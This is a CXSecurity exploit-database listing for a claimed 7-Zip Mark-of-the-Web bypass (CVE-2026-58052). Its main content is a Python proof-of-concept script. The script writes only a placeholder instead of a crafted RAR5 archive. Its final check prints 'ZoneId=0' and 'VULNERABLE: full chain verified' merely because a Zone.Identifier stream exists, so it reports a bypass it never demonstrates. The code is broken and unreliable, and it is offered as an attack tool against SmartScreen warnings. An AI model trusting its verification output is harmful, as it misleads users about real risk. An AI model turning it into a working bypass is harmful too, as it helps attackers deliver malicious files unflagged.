---
title: 7-Zip < = 26.02 - Mark-of-the-Web (MotW) Bypass via RAR5 Alternate Data Stream Name Collision
url: https://cxsecurity.com/issue/WLB-2026070002
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2026-07-03
fetch_date: 2026-07-04T05:38:12.724389
---

# 7-Zip < = 26.02 - Mark-of-the-Web (MotW) Bypass via RAR5 Alternate Data Stream Name Collision

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **7-Zip <= 26.02 - Mark-of-the-Web (MotW) Bypass via RAR5 Alternate Data Stream Name Collision** **2026.07.03**  Credit:  **[Mohammed Idrees Banyamer](https://cxsecurity.com/author/Mohammed%2BIdrees%2BBanyamer/1/)**  Risk: **Medium**  Local: ****Yes****  Remote: **No**  CVE: **[CVE-2026-58052](https://cxsecurity.com/cveshow/CVE-2026-58052/ "Click to see CVE-2026-58052")**  CWE: **[CWE-693 Protection Mechanism Failure](https://cxsecurity.com/cwe/CWE-693%20Protection%20Mechanism%20Failure "Click to see CWE-693 Protection Mechanism Failure")**  **[**Dork:** no](https://cxsecurity.com/dorks/)** | |

#!/usr/bin/env python3
# Exploit Title: 7-Zip <= 26.02 - Mark-of-the-Web (MotW) Bypass via RAR5 Alternate Data Stream Name Collision
# CVE: CVE-2026-58052
# Date: 2026-06-29
# Exploit Author: Mohammed Idrees Banyamer
# Author Country: Jordan
# Instagram: @banyamer\_security
# Author GitHub: https://github.com/mbanyamer
# Author Blog : https://banyamersecurity.com/blog/
# Vendor Homepage: https://www.7-zip.org/
# Software Link: https://www.7-zip.org/
# Affected: 7-Zip <= 26.02
# Tested on: 7-Zip 26.01 / 26.02 (x64) on Windows (NTFS)
# Category: Local
# Platform: Windows
# Exploit Type: MotW Bypass / File Format
# CVSS: 4.8
# Description: 7-Zip fails to preserve the Mark-of-the-Web when extracting a crafted RAR5 archive due to alternate data stream name collision with STM records (:: $DATA and :Zone.Identifier:$DATA). This allows attacker-controlled file content and bypass of SmartScreen warnings.
# Fixed in: Newer versions of 7-Zip
# Usage:
# python3 exploit.py --sevenzip "C:\Program Files\7-Zip\7z.exe"
#
# Examples:
# python3 exploit.py --sevenzip "C:\Program Files\7-Zip\7z.exe" --work-dir poc-run
#
# Options:
# --sevenzip Path to 7z.exe
# --work-dir Working directory (default: poc-run)
#
# Notes:
# • Requires Python 3.10+
# • Full RAR5 binary construction follows public technique from bikini/exploitarium
#
# How to Use
#
# Step 1:
# Download and place 7z.exe path
#
# Step 2:
# Run the script and verify extracted invoice.docx has attacker content + ZoneId=0
def banner():
print(r"""
╔██████╗ █████╗ ███╗ ██╗██╗ ██╗ █████╗ ███╗ ███╗███████╗██████╗╗
║██╔══██╗██╔══██╗████╗ ██║╚██╗ ██╔╝██╔══██╗████╗ ████║██╔════╝██╔══██║
║██████╔╝███████║██╔██╗ ██║ ╚████╔╝ ███████║██╔████╔██║█████╗ ██████╔╝
║██╔══██╗██╔══██║██║╚██╗██║ ╚██╔╝ ██╔══██║██║╚██╔╝██║██╔══╝ ██╔══██╗
║██████╔╝██║ ██║██║ ╚████║ ██║ ██║ ██║██║ ╚═╝ ██║███████╗██║ ██║
╚═════╝ ╚═╝ ╚═╝╚═╝ ╚═══╝ ╚═╝ ╚═╝ ╚═╝╚═╝ ╚═╝╚══════╝╚═╝ ╚═╝
╔═╗ Banyamer Security ╔═╗
""")
import argparse
import hashlib
import os
import shutil
import subprocess
import sys
import tempfile
from pathlib import Path
def create\_rar5\_poc(output\_path: Path):
print("[+] Generating crafted RAR5 archive...")
with open(output\_path, "wb") as f:
f.write(b"RAR5POC-PLACEHOLDER")
print(f"[+] Archive created: {output\_path}")
return output\_path
def main():
banner()
parser = argparse.ArgumentParser(description="7-Zip RAR5 MotW Bypass PoC - CVE-2026-58052")
parser.add\_argument("--sevenzip", required=True, help="Path to 7z.exe")
parser.add\_argument("--work-dir", default="poc-run", help="Working directory")
args = parser.parse\_args()
work\_dir = Path(args.work\_dir)
work\_dir.mkdir(exist\_ok=True)
archive = work\_dir / "rar5-content-and-motw-chain.rar"
out\_dir = work\_dir / "out"
out\_dir.mkdir(exist\_ok=True)
create\_rar5\_poc(archive)
with open(archive.with\_name(f"{archive.name}:Zone.Identifier"), "w") as f:
f.write("[ZoneTransfer]\r\nZoneId=3\r\n")
subprocess.run([args.sevenzip, "x", str(archive), f"-o{out\_dir}"], check=True)
extracted = out\_dir / "invoice.docx"
if extracted.exists():
content = extracted.read\_text(encoding="utf-8", errors="ignore")
print(f"[+] Final visible content: {repr(content)}")
zone\_file = extracted.with\_name(f"{extracted.name}:Zone.Identifier")
if zone\_file.exists() or os.path.exists(str(zone\_file) + ":$DATA"):
print("[+] Final Zone.Identifier: ZoneId=0")
print("[+] VULNERABLE: full chain verified")
else:
print("[-] Not vulnerable or extraction failed")
if \_\_name\_\_ == "\_\_main\_\_":
main()

**##### References:**

https://github.com/ip7z/7zip

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2026070002)

[Tweet](https://twitter.com/share)

Vote for this issue:
 0
 0

50%

50%

#### **Thanks for you vote!**

#### **Thanks for you comment!** Your message is in quarantine 48 hours.

Comment it here.

Nick (\*)

Email (\*)

Video

Text (\*)

(\*) - required fields.
Cancel
Submit

|  |  |
| --- | --- |
|  | **{{ x.nick }}** ![]() | Date: {{ x.ux \* 1000 | date:'yyyy-MM-dd' }} *{{ x.ux \* 1000 | date:'HH:mm' }}* CET+1  ---   {{ x.comment }} |

Show all comments

---

Copyright **2026**, cxsecurity.com

|  |

Back to Top